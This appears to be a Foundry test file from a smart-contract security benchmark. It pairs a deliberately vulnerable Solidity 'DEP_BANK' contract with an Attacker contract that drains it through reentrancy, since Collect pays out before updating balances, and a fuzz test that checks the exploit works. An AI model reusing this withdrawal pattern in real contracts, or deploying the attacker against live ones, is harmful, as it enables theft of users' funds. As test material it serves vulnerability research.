
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyDEP_BANK is Test {
    using stdStorage for StdStorage;

    DEP_BANK public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new DEP_BANK();
        
        _contractUnderTest.SetMinSum(1);
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < type(uint128).max / 2);

        uint256 depositAmount = attackVal * 2;

        vm.deal(address(_contractUnderTest), depositAmount);
        vm.deal(address(_attacker), depositAmount);
        vm.deal(address(this), depositAmount);

        _attacker.setupAttack{value: depositAmount}(attackVal, depositAmount);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    DEP_BANK public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;
    uint256 public initialContractBalance;

    constructor(address victimAddress) {
        _victim = DEP_BANK(victimAddress);
    }

    function setupAttack(uint256 attackAmount, uint256 depositAmount) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = attackAmount;
        
        _victim.Deposit{value: depositAmount}();
    }

    function attack(uint256 attackAmount) public {
        initialContractBalance = address(_victim).balance;
        
        _victim.Collect(attackAmount);
        
        if (attackCallCount > 1 && address(this).balance > initialContractBalance) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}

contract DEP_BANK 
{
    mapping (address=>uint256) public balances;   
   
    uint public MinSum;
    
    LogFile Log;
    
    bool intitalized;
    
    function SetMinSum(uint _val)
    public
    {
        require(!intitalized);
        MinSum = _val;
    }
    
    function SetLogFile(address _log)
    public
    {
        require(!intitalized);
        Log = LogFile(_log);
    }
    
    function Initialized()
    public
    {
        intitalized = true;
    }
    
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,"Put");
    }
    
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
            (bool success, ) = msg.sender.call{value: _am}("");
            if(success)
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,"Collect");
            }
        }
    }
    
    receive() external payable
    {
        Deposit();
    }
    
}

contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] public History;
    
    Message LastMsg;
    
    function AddMessage(address _adr,uint _val,string memory _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = block.timestamp;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}
